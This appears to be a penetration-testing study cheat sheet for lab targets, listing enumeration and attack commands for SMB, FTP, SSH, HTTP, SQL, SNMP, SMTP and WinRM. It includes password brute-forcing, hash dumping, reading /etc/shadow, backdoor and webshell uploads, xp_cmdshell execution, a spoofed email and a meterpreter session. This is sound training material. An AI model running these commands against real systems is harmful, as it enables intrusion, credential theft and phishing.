
This is the next step of a penetration testing. The goal is to enumerate all services to check if there are some misconfigurations.

# Summary

- [SMB](#smb)
  - [List Shares](#list-shares)
  - [Enumerate Users](#enumerate-users)
  - [Bruteforce](#bruteforce)

- [FTP](#ftp)
- [SSH](#ssh)
- [HTTP](#http)
- [SQL](#sql)
  - [MySQL](#mysql)
  - [MSSQL](#mssql)

- [SNMP](#snmp)
- [SMTP](#smtp)
  - [Version](#version)
  - [Username Enumeration](#username-enumeration)
  - [Send an email](#send-an-email)

- [WinRM](#winrm)



# SMB

SMB stands for Server Message Block. The goal is to share files.

**Tools** :
- rpcclient
- smbMap
- smbClient
- enum4linux

CS Links :
https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/

## List shares

With **smbMap**, you can list shares and its content : 
```bash
smbmap -H 10.2.16.224 -u "administrator" -p "smbserver_771"
smbmap -H 10.2.16.224 -u "administrator" -p "smbserver_771" -r $SHARE
```

Download or Upload file : 
```bash
smbmap -H 10.2.16.224 -u "administrator" -p "password" --download "C/flag.txt"

smbmap -H 10.0.28.123 -u "administrator" -p 'password' --upload '/root/backdoor' 'C$\backdoor
```

With **smbclient** : 
```bash
smbclient -L //192.42.109.3/ -U ""

smbclient //192.42.109.3/public -U ""
```

## Enumerate users

You can enumerate active users on the targets : 
```bash
# -a to enum all options
enum4linux -a <IP>

# With rpcclient : Connect then use enumdomusers
rpcclient -U "" -N <IP> 

# Metasploit Module :
use auxiliary/scanner/smb/smb_enumusers
```

## Bruteforce

This can be done with **hydra** : 
```bash
hydra -l Administrator -P /opt/rockyou.txt smb://<IP> -v -V
```

# FTP

FTP stands for File Transfer Protocol. The goal is also to share files.

- Check if anonymous login is allowed : 
```bash
ftp <IP>
```
**Username** : anonymous/anonymous/`<blank>`
**Password** : ``<blank>``/anonymous/``<blank>``

Nmap can also do this with **NSE** : 
```bash
nmap -p21 <IP> --script ftp-anon
```

- Check FTP version : 
```bash
nmap -p21 <IP> -sV
```

# SSH

SSH stands for Secure SHell. The goal is to have a remote access on a machine.

- Pre-login banner grab :
```bash
ssh <IP>
```

- List authentication methods :
```bash
nmap <IP> -p22 --script ssh-auth-methods --script-args="ssh.user=admin"
```

- Bruteforce : 
```bash
# With Hydra
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://192.213.135.3 -v -V

# With Nmap NSE
nmap -p22 192.213.135.3 --script ssh-brute --script-args="userdb=users.txt","passdb=passwords.lst"

# With Metasploit :
use auxiliary/scanner/ssh/ssh_login
```


# HTTP

HTTP stands for HyperText Transfer Protocol.

- Get version, information : 
```bash
# With nmap :
nmap -p80 <IP> -sC -sV

# Whatweb : 
whatweb <IP>

# Curl : 
curl http://<IP>/ -I
```


- Directory enumeration :
```bash
# Gobuster :
gobuster dir --url http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x html,php,txt,aspx,zip

# Dirb : 
dirb http://<IP>/

# Metasploit (WMAP) :
load wmap
wmap_sites -a http://<IP>
wmap_targets -t http://<IP>
wmap_run -t
```

- Check allowed methods :
```bash
# BurpSuite : (Change Method Request)
OPTIONS /uploads/ ....

# cURL :
curl -X OPTIONS -v http://<IP>/uploads/
```

- Look if you can upload file :
```bash
curl http://<IP>/uploads/ --upload-file webshell.php
```

# SQL

SQL stands for Structured Query Language. 

## MySQL

- Connect to database : 
```bash
mysql -h <IP> -u root
```

- Read arbitrary file : 
```sql
SELECT LOAD_FILE('/etc/shadow') AS Result;
```

- Enumerate users : 
```bash
# With Nmap NSE :
nmap <IP> --script mysql-users --script-args="mysqluser='root',mysqlpass=''"
```

- Dump user's hash : 
```bash
# Metasploit Module : 
use auxiliary/scanner/mysql/mysql_hashdump

# With Nmap NSE :
nmap -p3306 <IP> --script mysql-dump-hashes --script-args="username='root',password=''"
```

- Dictionary Attack :
```bash
# Metasploit Module :
use auxiliary/scanner/mysql/mysql_login

# Hydra :
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://192.64.63.3 -v -V
```

## MSSQL

- Bruteforce :
```bash
# Metasploit Module :
use auxiliary/scanner/mssql/mssql_login
```

- Dump hashes : 
```bash
nmap <IP> -p1433 --script ms-sql-dump-hashes --script-args mssql.username='admin',mssql.password=''
```

- Execute command via `xp_cmdshell` : 
```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password='',ms-sql-xp-cmdshell.cmd='whoami' 10.2.31.174
```

Resource : https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

# SNMP

> SNMP (Simple Network Management Protocol) is a widely used protocol
for monitoring and managing networked devices, such as routers,
switches, printers, servers, and more.

Check if the port is open : 
```bash
nmap -sU -p161,162 <IP>
```

Find community strings :
```bash
# Nmap :
nmap -sU -p161 --script=snmp-brute <IP>
```

Extract information :
```bash
snmpwalk -v <VERSION> -c <COMMUNITY> <IP>
```


CS Link : [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)

# SMTP

> SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for
the transmission of email.

## Version

Get the SMTP version :
```bash
# Metasploit Module :
use auxiliary/scanner/smtp/smtp_version

# Banner Grabbing :
nc -vn <IP> 25
```

## Username Enumeration

*Source* : [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#username-bruteforce-enumeration)

**Manually** : This technique uses `VRFY` : 
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```

There are other techniques ! Please check the HackTricks link !

**Automatic** : 
```bash
# smtp-user-enum :
Examples:

$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1

# Metasploit Module :
use auxiliary/scanner/smtp/smtp_enum
```

## Send an email

```bash
# sendemail :
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```


# WinRM

List authentication methods :
```bash
# Metasploit Module :
use auxiliary/scanner/winrm/winrm_auth_methods

set RHOSTS <IP>
```

Bruteforce :
```bash
# Metasploit Module :
use auxiliary/scanner/winrm/winrm_login

set USERNAME Administrator
set PASS_FILE /opt/rockyou.txt
```

Get a meterpreter session :
```bash
# Metasploit Module :
use exploit/windows/winrm/winrm_script_exec

set USERNAME Administrator
set PASSWORD password
set FORCE_VBS true
```
